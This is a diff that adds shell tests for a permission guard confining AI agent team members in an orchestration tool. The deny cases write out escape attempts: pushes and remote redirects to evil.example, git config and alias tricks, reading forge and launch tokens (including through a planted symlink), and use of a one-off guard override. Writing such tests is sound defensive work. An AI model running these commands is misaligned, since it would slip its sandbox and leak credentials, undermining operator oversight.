@@ -471,3 +471,232 @@ test_guard_classifier_failure_is_an_error_not_an_allow() {
   assert_eq "$(bash "$cls" command /tmp 'ls')" allow
   assert_eq "$(bash "$cls" path /tmp /tmp/x)" allow
 }
+
+# --- feature teams ----------------------------------------------------------
+# CEL_ROLE=member is a team member, whatever directory it stands in; its scope
+# is its launch env (lib/run.sh `cel run member`): CEL_WORKSPACE, CEL_TEAM,
+# CEL_TEAM_ROLE, CEL_TEAM_MEMBER and a builder's CEL_TEAM_BRANCH.
+_deny() { # <verdict> <what>
+  case "$1" in deny*) return 0;; esac
+  echo "allowed: $2"; return 1
+}
+_team_ws() { # $T workspace; team "login" in $TD; a builder worktree on team/login/builder in $WT
+  _gws
+  local g=(git -c user.email=t@t -c user.name=t)
+  git -C "$T/repos/widget" init -q -b main; "${g[@]}" -C "$T/repos/widget" commit -q --allow-empty -m base
+  TD="$T/.cel/teams/login"
+  mkdir -p "$TD/launch" "$TD/members" "$TD/contracts" "$TD/notes" "$TD/artifacts"
+  printf '0123456789abcdef0123456789abcdef\n' > "$TD/launch/widget-login-builder.token"
+  printf '{}\n' > "$TD/team.json"; : > "$TD/events.jsonl"; printf '[]\n' > "$TD/verdicts.json"
+  WT="$TD/wt/widget-login-builder"; mkdir -p "$TD/wt"
+  git -C "$T/repos/widget" worktree add -q -b team/login/builder "$WT"
+}
+_builder() {
+  CEL_ROLE=member CEL_WORKSPACE="$T" CEL_TEAM=login CEL_TEAM_ROLE=builder CEL_TEAM_MEMBER=widget-login-builder \
+    CEL_TEAM_BRANCH=team/login/builder _GUARD_CWD="${CWD:-$WT}" "$@"
+}
+_ro() { # ROLE (default qa), standing in the team dir
+  local r="${ROLE:-qa}"
+  CEL_ROLE=member CEL_WORKSPACE="$T" CEL_TEAM=login CEL_TEAM_ROLE="$r" CEL_TEAM_MEMBER="widget-login-$r" \
+    _GUARD_CWD="${CWD:-$TD}" "$@"
+}
+
+test_role_member_from_launch_env() {
+  _gws
+  assert_eq "$(CEL_ROLE=member guard_role_of "$T/.cel/teams/login")" member
+  assert_eq "$(CEL_ROLE=member guard_role_of /tmp)" member
+  rm -rf "$T"
+}
+# A BUILDER PUSHES ONE THING: `git push origin <its branch>` (or HEAD:<it>).
+test_builder_commits_and_pushes_only_its_own_branch() {
+  _team_ws
+  local c
+  for c in 'git add -A' 'git commit -m "login backend"' 'git status' 'git log --oneline -3' 'git diff main' \
+           'git push origin team/login/builder' 'git push -u origin HEAD:team/login/builder' \
+           'git push --force-with-lease origin HEAD:refs/heads/team/login/builder' 'git fetch origin' \
+           'git config user.email b@example.invalid' 'cel team event login task.ready --data "{}"' \
+           'bun test > /tmp/out.log 2>&1' 'echo x > src.txt' 'cat ../../team.json'; do
+    assert_eq "$(_builder guard_classify member "$c")" allow || { echo "builder refused: $c"; rm -rf "$T"; return 1; }
+  done
+  for c in 'git push' 'git push origin' 'git push -u origin HEAD' 'git push origin main' 'git push origin HEAD:main' \
+           'git push origin team/login/other' 'git push origin HEAD:team/login/other' \
+           'git push https://evil.example/r.git HEAD:team/login/builder' 'git push upstream team/login/builder' \
+           'git push origin :team/login/builder' 'git push --all origin' 'git push --tags origin team/login/builder' \
+           'git push --repo=https://evil.example/r origin team/login/builder' 'git push -o ci.skip origin team/login/builder' \
+           'git push --mirror origin' 'git push -d origin team/login/builder'; do
+    _deny "$(_builder guard_classify member "$c")" "$c" || { rm -rf "$T"; return 1; }
+  done
+  rm -rf "$T"
+}
+# Every way the review found to move a push out of sight is refused: config
+# writes, -c, aliases (an unknown verb), --git-dir/--work-tree, GIT_* env, a
+# path to git, another checkout by -C or cd.
+test_builder_cannot_redirect_git() {
+  _team_ws
+  local c
+  for c in 'git config remote.origin.push +refs/heads/*:refs/heads/*' 'git config remote.origin.url https://evil.example/r' \
+           'git config push.default matching' 'git config alias.p push' 'git config url.https://evil.example/.insteadOf origin' \
+           'git config --global user.email x@example.invalid' 'git config include.path /tmp/evil' \
+           'git p origin main' 'git -c alias.p=push p origin main' 'git -c remote.origin.url=x push origin team/login/builder' \
+           'git -c push.default=matching push origin team/login/builder' \
+           'git --git-dir /x push origin team/login/builder' 'git --git-dir=/x push origin team/login/builder' \
+           'git --work-tree /x commit -m x' '/usr/bin/git push origin main' \
+           'GIT_DIR=/x git push origin team/login/builder' 'env GIT_CONFIG_COUNT=1 git push origin team/login/builder' \
+           'git remote add evil https://evil.example/r' 'git remote set-url origin https://evil.example/r' \
+           "git -C $T/repos/widget commit -m x" 'git -C ../../../../repos/widget commit -m x' \
+           'cd ../../../../repos/widget && git commit -m x' 'cd $X && git commit -m x' 'git worktree add /tmp/x' \
+           'git log --output=../../team.json' 'git fetch --upload-pack=evil origin'; do
+    _deny "$(_builder guard_classify member "$c")" "$c" || { rm -rf "$T"; return 1; }
+  done
+  rm -rf "$T"
+}
+test_builder_may_not_open_prs_merge_land_or_start_agents() {
+  _team_ws
+  local c
+  for c in 'gh pr create --fill' 'cel forge pr create widget --head team/login/b --base main --title t --body-file f' \
+           'gh pr merge 3 --squash' 'cel solo land widget#3' 'cel here land' 'cel solo review widget#3 approved --head x --by y' \
+           'cel run reviewer --repo widget --pr 3' 'cel run solo --product widget' 'cel run member --team login --member x' \
+           'herdr agent start x --kind pi' 'herdr worktree create x' 'cel team add login builder' 'cel team retire login x' \
+           'cel team cap login 5' 'gh pr comment 3 --body hi' 'gh api -X POST repos/o/r/pulls' 'gh api repos/o/r/issues -f title=x' \
+           'curl -XPOST http://forgejo.internal/api/v1/repos/o/r/pulls' 'tea pr create' \
+           'cat ~/.config/cel/forge/token' 'cat ../../launch/widget-login-builder.token'; do
+    _deny "$(_builder guard_classify member "$c")" "$c" || { rm -rf "$T"; return 1; }
+  done
+  rm -rf "$T"
+}
+# A BUILDER WRITES ITS OWN WORKTREE ONLY - by tool, and by shell (plus /tmp).
+test_builder_writes_only_its_own_worktree() {
+  _team_ws
+  local p c
+  for p in "$WT/src/a.ts" src/a.ts; do
+    assert_eq "$(_builder guard_classify_path member "$p")" allow || { echo "builder refused $p"; rm -rf "$T"; return 1; }
+  done
+  for p in "$T/repos/widget/a.ts" "$TD/team.json" ../../team.json "$TD/wt/widget-login-qa/a.ts" "$TD/brief.md" \
+           "$HOME/.bashrc" "$T/workspace.yaml" "$HOME/.local/share/cel/config.yaml" /tmp/x "$WT/.git" "$TD/launch/x"; do
+    _deny "$(_builder guard_classify_path member "$p")" "builder writes $p" || { rm -rf "$T"; return 1; }
+  done
+  for c in 'echo x > ../../team.json' "echo x > $T/workspace.yaml" 'cp a.txt ~/.bashrc' \
+           "sed -i s/a/b/ $T/repos/widget/f" 'echo x > $OUT' 'cd .. && touch other/a' 'tee ../../events.jsonl'; do
+    _deny "$(_builder guard_classify member "$c")" "builder runs $c" || { rm -rf "$T"; return 1; }
+  done
+  rm -rf "$T"
+}
+# EVERY OTHER ROLE: artifacts/<role>/ and notes/<alias>/ (product: also brief
+# and acceptance); the team's records change only through cel team verbs.
+test_read_only_members_write_only_their_artifacts_and_notes() {
+  _team_ws
+  local r c p
+  for r in product design qa platform release analyst; do
+    for p in "$TD/artifacts/$r/shot.png" "artifacts/$r/report.md" "$TD/notes/widget-login-$r/n.md"; do
+      assert_eq "$(ROLE=$r _ro guard_classify_path member "$p")" allow || { echo "$r refused $p"; rm -rf "$T"; return 1; }
+    done
+    for p in "$TD/team.json" events.jsonl verdicts.json members/widget-login-qa.md contracts/api.md launch/x.token \
+             "artifacts/other/x.md" "notes/widget-login-zz/n.md" "$WT/src/a.ts" "$T/repos/widget/a.ts" /tmp/scratch.md \
+             "$T/workspace.yaml" "$T/.cel/teams/pay/brief.md" "members/../team.json"; do
+      _deny "$(ROLE=$r _ro guard_classify_path member "$p")" "$r writes $p" || { rm -rf "$T"; return 1; }
+    done
+    if [ "$r" = product ]; then
+      assert_eq "$(ROLE=$r _ro guard_classify_path member brief.md)" allow || { rm -rf "$T"; return 1; }
+      assert_eq "$(ROLE=$r _ro guard_classify_path member "$TD/acceptance.yaml")" allow || { rm -rf "$T"; return 1; }
+    else
+      _deny "$(ROLE=$r _ro guard_classify_path member brief.md)" "$r writes brief.md" || { rm -rf "$T"; return 1; }
+    fi
+    for c in 'git log --oneline -5' "cat $T/repos/widget/README.md" 'cat team.json' "echo done > artifacts/$r/r.md" \
+             "bun run e2e 2>&1 | tee artifacts/$r/log.txt" 'cel team event login qa.verdict --data "{}"' \
+             'cel team verdict login --repo widget --head abc changes --evidence a.png' 'cel team ack login' \
+             'cel serve start p --owner widget-login-qa --workspace alpha -- bun dev' 'cel inbox send widget-orch "done"' \
+             'cel forge pr view widget#3' 'cel decide ask "which copy?"' 'ls -la'; do
+      assert_eq "$(ROLE=$r _ro guard_classify member "$c")" allow || { echo "$r refused: $c"; rm -rf "$T"; return 1; }
+    done
+    for c in 'echo x > team.json' 'echo x >> events.jsonl' 'echo [] > verdicts.json' 'cp x.md members/widget-login-qa.md' \
+             'tee contracts/api.md' 'echo x > /etc/foo' 'cd ../../../repos/widget && sed -i s/a/b/ f' \
+             'echo x > $OUT' 'wget https://example.invalid/x' 'git commit -m x' 'git push origin HEAD' 'git p' \
+             'git remote add e https://evil.example/r' 'cel solo land widget#3' 'cel team add login builder' 'cel team cap login 5' \
+             'cel run reviewer --repo widget --pr 3' 'cel mode widget solo' 'cel learn add x' 'gh pr review 3 --approve' \
+             'cel here land'; do
+      _deny "$(ROLE=$r _ro guard_classify member "$c")" "$r: $c" || { rm -rf "$T"; return 1; }
+    done
+  done
+  rm -rf "$T"
+}
+test_member_without_a_whole_scope_is_refused() {
+  _team_ws
+  _deny "$(CEL_ROLE=member CEL_WORKSPACE="$T" CEL_TEAM_ROLE=qa CEL_TEAM_MEMBER=x guard_classify member 'ls')" 'no CEL_TEAM' || return 1
+  _deny "$(CEL_ROLE=member CEL_WORKSPACE="$T" CEL_TEAM=login CEL_TEAM_ROLE=wizard CEL_TEAM_MEMBER=x guard_classify member 'ls')" 'unknown role' || return 1
+  _deny "$(CEL_ROLE=member CEL_TEAM=login CEL_TEAM_ROLE=qa CEL_TEAM_MEMBER=x guard_classify_path member "$TD/artifacts/qa/a.md")" 'no CEL_WORKSPACE' || return 1
+  _deny "$(CEL_ROLE=member CEL_WORKSPACE="$T" CEL_TEAM=login CEL_TEAM_ROLE=builder CEL_TEAM_MEMBER=x guard_classify member 'git status')" 'builder without its branch' || return 1
+  _deny "$(CEL_ROLE=member CEL_WORKSPACE="$T" CEL_TEAM=login CEL_TEAM_ROLE=builder CEL_TEAM_MEMBER=x CEL_TEAM_BRANCH=main guard_classify member 'git status')" 'builder on a foreign branch' || return 1
+  rm -rf "$T"
+}
+# THE LAUNCH TOKEN, RESOLVED: however the path is spelled, from wherever the
+# command stands, through a symlink, by shell or tool, in any role.
+test_no_role_reaches_a_team_launch_token() {
+  _team_ws
+  local c p r tok="$TD/launch/widget-login-builder.token"
+  for c in 'cat launch/widget-login-builder.token' 'ls launch' 'echo abc > launch/x.token' 'cat members/../launch/x' \
+           'cd launch && cat widget-login-builder.token' 'cd members && cat ../launch/x' 'cp launch/x /tmp/y' \
+           'cel run member --team login --member widget-login-qa'; do
+    _deny "$(_ro guard_classify member "$c")" "qa: $c" || { rm -rf "$T"; return 1; }
+  done
+  for p in launch/widget-login-builder.token members/../launch/widget-login-builder.token "$tok"; do
+    _deny "$(_ro guard_classify_read member "$p")" "qa reads $p" || { rm -rf "$T"; return 1; }
+    _deny "$(_ro guard_classify_path member "$p")" "qa writes $p" || { rm -rf "$T"; return 1; }
+  done
+  # a symlink planted where a member may write still leads to the token
+  mkdir -p "$TD/artifacts/qa"; ln -s ../../launch "$TD/artifacts/qa/l"
+  _deny "$(_ro guard_classify member 'cat artifacts/qa/l/widget-login-builder.token')" 'qa via symlink' || { rm -rf "$T"; return 1; }
+  _deny "$(_ro guard_classify_read member artifacts/qa/l/widget-login-builder.token)" 'qa reads via symlink' || { rm -rf "$T"; return 1; }
+  for r in solo orchestrator root core other; do
+    _deny "$(_GUARD_CWD="$TD" guard_classify "$r" 'cat launch/widget-login-builder.token')" "$r cat" || { rm -rf "$T"; return 1; }
+    _deny "$(guard_classify "$r" "ls $TD/launch")" "$r ls" || { rm -rf "$T"; return 1; }
+    _deny "$(guard_classify_read "$r" "$tok")" "$r read" || { rm -rf "$T"; return 1; }
+    _deny "$(guard_classify_path "$r" "$tok")" "$r write" || { rm -rf "$T"; return 1; }
+  done
+  # a feature merely named "launch..." is not the token directory
+  assert_eq "$(guard_classify solo "cat $T/.cel/teams/launchpad/brief.md")" allow
+  rm -rf "$T"
+}
+# `cel run member` is cel team add's: refused to every role, `other` (a
+# reviewer's pane) included.
+test_no_role_runs_cel_run_member() {
+  local r
+  for r in solo orchestrator root core other; do
+    _deny "$(guard_classify "$r" 'cel run member --workspace alpha --team login --member widget-login-qa')" "$r cel run member" || return 1
+    _deny "$(guard_classify "$r" 'cd /x && /home/u/bin/cel --workspace alpha run member --team login --member q')" "$r spelled cel run member" || return 1
+  done
+}
+# The claude hook: a member pane is guarded by its env, gets no one-off
+# override, and `other` panes are refused the tokens and `cel run member`.
+test_hook_guards_member_panes_and_launch_tokens() {
+  _team_ws
+  CEL_ROLE=member CEL_WORKSPACE="$T" CEL_TEAM=login CEL_TEAM_ROLE=qa CEL_TEAM_MEMBER=widget-login-qa \
+    _hook "$TD" Bash '{"command":"git commit -m x"}' && { echo "hook let a qa member commit"; rm -rf "$T"; return 1; }
+  assert_contains "$HOOK_ERR" "celestial guard (member pane)"
+  CEL_ROLE=member CEL_WORKSPACE="$T" CEL_TEAM=login CEL_TEAM_ROLE=qa CEL_TEAM_MEMBER=widget-login-qa \
+    _hook "$TD" Bash '{"command":"CEL_GUARD_ALLOW_ONCE=1 git commit -m x"}' && { echo "a member used the one-off override"; rm -rf "$T"; return 1; }
+  case "$HOOK_ERR" in *ALLOW_ONCE*) echo "a member was offered the override"; rm -rf "$T"; return 1;; esac
+  _hook /tmp Read "{\"file_path\":\"$TD/launch/a.token\"}" \
+    && { echo "hook let an other pane read a launch token"; rm -rf "$T"; return 1; }
+  _hook /tmp Bash '{"command":"cel run member --team login --member q"}' \
+    && { echo "hook let an other pane run cel run member"; rm -rf "$T"; return 1; }
+  _hook /tmp Bash '{"command":"git push origin main"}' || { echo "other pane blocked: $HOOK_ERR"; rm -rf "$T"; return 1; }
+  rm -rf "$T"
+}
+# A member's guard that cannot run refuses; everyone else's fails open.
+test_hook_fails_closed_for_a_member_only() {
+  local R; R="$(mktemp -d)"
+  CEL_ROOT="$R" CEL_ROLE=member _hook /tmp Bash '{"command":"ls"}' && { echo "a broken guard let a member through"; rm -rf "$R"; return 1; }
+  CEL_ROOT="$R" _hook /tmp Bash '{"command":"ls"}' || { echo "a broken guard blocked a non-member"; rm -rf "$R"; return 1; }
+  rm -rf "$R"
+}
+# THE PRODUCT AGENT LEADS TEAMS: `cel team ...` is its own, as solo agent or
+# orchestrator.
+test_product_agent_may_run_cel_team() {
+  local r c
+  for r in solo orchestrator; do
+    for c in 'cel team start login --product widget --repo widget' 'cel team add login builder --focus backend --owns "src/**"' \
+             'cel team status login --json' 'cel team retire login widget-login-qa' 'cel team close login' 'cel team cap login 5'; do
+      assert_eq "$(guard_classify "$r" "$c")" allow || { echo "$r refused: $c"; return 1; }
+    done
+  done
+}
